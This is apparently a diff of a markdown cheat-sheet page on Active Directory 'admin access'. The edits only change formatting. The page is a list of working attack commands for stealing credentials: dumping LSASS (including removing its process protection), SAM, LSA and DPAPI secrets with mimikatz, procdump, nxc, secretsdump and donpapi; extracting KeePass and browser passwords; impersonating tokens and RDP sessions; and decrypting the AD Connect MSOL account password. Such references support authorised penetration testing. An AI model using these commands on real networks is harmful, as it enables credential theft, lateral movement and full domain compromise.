@@ -2,18 +2,19 @@
 title: "Admin Access"
 description: "Admin Access techniques and commands for Active Directory security assessment."
 ---
+# Admin Access
 ## Extract credentials from LSASS.exe
 - LSASS as protected process
   - `PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update`
   - `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"  "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"`
-- Extract LSASS secrets  >>> User + Pass || NTLM || PassTheHash || Clear text move
+- Extract LSASS secrets *User + Pass || NTLM || PassTheHash || Clear text move*{: .highlight}
   - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
   - `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "exit"`
   - `msf> load kiwi creds_all`
   - `nxc smb <ip_range> -u <user> -p <password> -M lsassy`
   - `lsassy -d <domain> -u <user> -p <password> <ip>`
 
-## Extract credentials from SAM >>> NTLM || PassTheHash
+## Extract credentials from SAM *NTLM || PassTheHash*{: .highlight}
 - `nxc smb <ip_range> -u <user> -p <password> --sam`
 - `msf> hashdump`
 - `mimikatz "privilege::debug" "lsadump::sam" "exit"`
@@ -24,7 +25,7 @@ description: "Admin Access techniques and commands for Active Directory security
   - `secretsdump.py -system SYSTEM -sam SAM LOCAL`
 - `regsecrets.py <domain>/<user>:<password>@<ip>`
 
-## Extract credentials from LSA >>> MsCache 2 || User + Pass
+## Extract credentials from LSA *MsCache 2 || User + Pass*{: .highlight}
 - `nxc smb <ip_range> -u <user> -p <password> --lsa`
 - `mimikatz "privilege::debug" "lsadump::lsa" "exit"`
 - `reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>`
@@ -32,7 +33,7 @@ description: "Admin Access techniques and commands for Active Directory security
 - `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`
 
 ## Extract credentials from DPAPI
-- DPAPI >>> User + Pass || PassTheHash || Clear text move
+- DPAPI *User + Pass || PassTheHash || Clear text move*{: .highlight}
   - `nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]`
   - `donpapi <domain>/<user>:<password>@<target>`
   - `dpapidump.py <domain>/<user>:<password>@<target>`
@@ -43,34 +44,34 @@ description: "Admin Access techniques and commands for Active Directory security
       - `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>`
   - `SharpDPAPI.exe triage`
 
-- Crack users masterkey >>> DPAPImk
+- Crack users masterkey *DPAPImk*{: .highlight}
   - copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID> 
     - `DPAPImk2john.py --preferred <prefered_file>`
       - `DPAPImk2john.py -c domain -mk <masterkey> -S <sid>`
 
 ## Impersonate
-- Impersonate >>> ACL || User + Pass
+- Impersonate *ACL || User + Pass*{: .highlight}
   - `msf> use incognito impersonate_token <domain>\\<user>`
   - `nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users`
     - `nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>`
   - `irs.exe list`
     - `irs.exe exec -p <pid> -c <command>`
 
-- Impersonate with adcs >>> NTLM || Pass The Hash / Ticket / Certificate
+- Impersonate with adcs *NTLM || Pass The Hash / Ticket / Certificate*{: .highlight}
   - `masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>`
 
-- Impersonate RDP Session >>> RDP
+- Impersonate RDP Session *RDP*{: .highlight}
   - `psexec.exe -s -i cmd`
     - `query user`
       - `tscon.exe <id> /dest:<session_name>`
 
 ## Misc
-- Find Users >>> Username
+- Find Users *Username*{: .highlight}
   - `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv`
-- Extract Keepass >>> User + Pass
+- Extract Keepass *User + Pass*{: .highlight}
   - `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
   - `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
-- Hybrid (Azure AD-Connect) >>> DCSYNC
+- Hybrid (Azure AD-Connect) *DCSYNC*{: .highlight}
   - Dump cleartext password of MSOL Account on ADConnect Server
     - `azuread_decrypt_msol_v2.ps1`
     - `nxc smb <ip> -u <user> -p <password> -M msol`
